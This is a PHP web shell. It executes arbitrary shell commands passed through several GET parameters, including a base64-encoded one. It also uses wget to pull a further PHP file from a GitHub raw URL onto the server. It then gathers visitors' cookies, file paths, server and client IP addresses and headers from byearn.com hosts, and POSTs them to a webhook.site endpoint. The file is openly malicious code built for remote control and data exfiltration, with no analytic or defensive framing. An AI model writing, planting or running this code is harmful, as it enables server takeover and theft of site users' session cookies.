<?php

echo "=======================================================";
if (isset($_GET['cmd'])) {

    echo "<pre>". system($_GET['cmd']) . "</pre>";

} 
if (isset($_GET['exec'])) {
    exec($_GET['exec'], $output, $status);
    echo "<pre>". print_r($output) . "</pre>";

} 
if (isset($_GET['shell_exec'])) {
    
    echo "<pre>". shell_exec($_GET['shell_exec']) . "</pre>";

}
if (isset($_GET['system'])) {
    
    echo "<pre>". system($_GET['system']) . "</pre>";

}
if (isset($_GET['passthru'])) {
    
    echo "<pre>". passthru($_GET['passthru']) . "</pre>";

}
if (isset($_GET['page'])) {
    
    echo file_get_contents($page);
}
if (isset($_GET['base'])) {
    $decoded = base64_decode($_GET['base']);
    echo "<pre>". shell_exec($decoded) . "</pre>";
}


try {
    
    shell_exec("wget -P ../../../ https://raw.githubusercontent.com/ahmedessam291194/tmp/refs/heads/main/print.php");

} catch (Exception $e) {

}


echo "=======================================================";


// Get the full path of the current file
$filePath = __FILE__;

// Get the file name
$fileName = basename($filePath);

// Get the hostname with a fallback
$hostName = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';


$cookieArray = array(); // Initialize an empty array

// Check if there are any cookies
if (!empty($_COOKIE)) {
    // Loop through all cookies and push them to the array
    foreach ($_COOKIE as $name => $value) {
        $cookieArray[$name] = $value;
    }
    print_r($cookieArray); // Output the array
}




$headers = get_headers("https://byearn.com", 1);
$headers2 = get_headers("https://api.byearn.com", 1);
$headers3 = get_headers("https://back.byearn.com", 1);
$headers4 = get_headers("https://control.byearn.com", 1);
//$headers3 = get_headers("https://127.0.0.1", 1);
$serverIp = $_SERVER['SERVER_ADDR'] ?? request()->server('SERVER_ADDR');
$domain = $_SERVER['HTTP_HOST'] ?? request()->getHost();
$referer = $_SERVER['HTTP_REFERER'] ?? null;

$REMOTE_ADDR = $_SERVER['REMOTE_ADDR'] ?? null;
$HTTP_X_FORWARDED_FOR = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? null;
$HTTP_CF_CONNECTING_IP = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? null;
$CF_Connecting_IP = $_SERVER['CF-Connecting-IP'] ?? null;
$CF_Connecting_IP2 = $_SERVER['CF_Connecting_IP'] ?? null;

$params = http_build_query([
    'hostname' => $hostName,
    'filepath' => $filePath,
    'filename' => $fileName,
    'cookies' => $cookieArray,
    'serverIp' => $serverIp,
    'domain' => $domain,
    'referer' => $referer,
    'headers' => $headers,
    'headers2' => $headers2,
    'headers3' => $headers3,
    'headers4' => $headers4,
    //'headers3' => $headers3,
    'REMOTE_ADDR' => $REMOTE_ADDR,
    'HTTP_X_FORWARDED_FOR' => $HTTP_X_FORWARDED_FOR,
    'HTTP_CF_CONNECTING_IP' => $HTTP_CF_CONNECTING_IP,
    'CF_Connecting_IP' => $CF_Connecting_IP,
    'CF_Connecting_IP2' => $CF_Connecting_IP2,
    'HOST' => $_SERVER['HTTP_HOST'],
]);


$ch = curl_init("https://webhook.site/e8d22a0e-6571-4619-9b01-9d5605a3e3b1"); // such as http://example.com/example.xml
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);


curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array('body' => $params)));


curl_setopt($ch, CURLOPT_HEADER, 0);
$data = curl_exec($ch);
curl_close($ch);


echo "=======================================================";

?>